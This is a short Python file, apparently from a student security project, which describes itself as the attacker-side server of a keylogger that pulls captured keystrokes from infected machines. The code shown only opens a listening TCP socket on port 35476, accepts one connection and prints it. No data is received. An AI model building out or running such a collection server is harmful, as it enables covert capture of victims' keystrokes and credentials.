"""
keylogserver.py
Authors: Dominick Taylor (dxt9140@g.rit.edu)
         Bikash
         Isza
When run by the hacker, this file is responsible for pinging the keylogger on
the agreed upon hostname and port and then receiving the obtained data. Once
the file is sent to this server, the keylogger will clear its own buffer.
"""

import socket

DEFAULT_PORT = 35476

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection = (socket.gethostname(), DEFAULT_PORT)
    s.bind(connection)
    s.listen(1)
    client, addr = s.accept()
    print( client )

if __name__ == '__main__':
    main()

